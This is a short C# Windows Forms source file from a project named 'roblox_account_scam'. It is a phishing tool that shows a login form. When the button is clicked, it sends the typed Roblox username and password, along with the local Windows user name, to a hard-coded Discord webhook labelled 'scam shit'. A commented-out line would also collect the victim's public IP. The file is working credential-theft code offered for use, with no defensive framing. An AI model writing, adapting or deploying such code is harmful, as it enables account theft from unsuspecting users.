using System;
using System.Collections.Specialized;
using System.Windows.Forms;

namespace roblox_account_scam
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            webhook("https://discordapp.com/api/webhooks/663422008532533259/dYkQWNKigfzOryLpeSSq8iIDdmDuD-abYwQeybIUeFsezOFZ5n-ublCKUZ8H2nFyiFne", string.Concat(new string[]
                               {
                            "```Username: ",
                            Environment.UserName.ToString(),
                            "\r\nUsername: ",
                            textBox1.Text.ToString(),
                            "\r\nPassword: ",
                            maskedTextBox1.Text.ToString(),
                            "\r\nIP: ",
                            //new WebClient().DownloadString("http://api.ipify.org/"),                  
                            "```"

                               }));
        }

        public static void webhook(string webhook, string msg)
        {
            send.Post(webhook, new NameValueCollection
            {
                {
                    "username",
                    "scam shit"
                },
                {
                    "content",
                    msg
                }
            });
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }
    }
}
